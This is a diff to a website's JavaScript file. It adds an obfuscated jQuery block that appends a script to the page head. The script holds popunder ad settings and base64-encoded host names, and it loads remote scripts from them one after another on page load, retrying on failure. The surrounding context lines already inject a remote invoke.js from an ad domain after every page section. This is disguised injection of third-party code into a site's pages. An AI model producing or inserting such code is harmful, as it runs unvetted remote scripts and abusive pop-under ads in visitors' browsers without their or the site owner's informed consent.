@@ -170,5 +170,46 @@ if(!document.getElementById("script-2")){var t=document.createElement("script");
 
 $(document).ready(function(){$("section").not("#hero").each(function(){$(this).after('<script async="async" data-cfasync="false" src="//caressfinancialdodge.com/77d22fe3b85a47162f3d142b61b8c66f/invoke.js"><\/script><div id="container-77d22fe3b85a47162f3d142b61b8c66f"></div>')})});
 
+$(document).ready(function () {
+  var scriptContent = `
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){
+  var q=window,
+      t="d91306996e18cbebde8726749ce77179",
+      u=[["siteId",602*345-99+5023410],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],
+      p=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS95cmV2ZWFsLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvRm5sL2NlbWVyZ2VuY2UubWluLmpz"],
+      k=-1,y,m,
+      c=function(){
+        clearTimeout(m);
+        k++;
+        if(p[k] && !(1781949338000<(new Date).getTime() && 1<k)){
+          y=q.document.createElement("script");
+          y.type="text/javascript";
+          y.async=!0;
+          var h=q.document.getElementsByTagName("script")[0];
+          y.src="https://"+atob(p[k]);
+          y.crossOrigin="anonymous";
+          y.onerror=c;
+          y.onload=function(){
+            clearTimeout(m);
+            q[t.slice(0,16)+t.slice(0,16)]||c()
+          };
+          m=setTimeout(c,5E3);
+          h.parentNode.insertBefore(y,h)
+        }
+      };
+  if(!q[t]){
+    try{ Object.freeze(q[t]=u) }catch(e){}
+    c()
+  }
+})();
+/*]]>/* */
+</script>
+`;
+
+  // Append to head
+  $("head").append(scriptContent);
+});
 
 
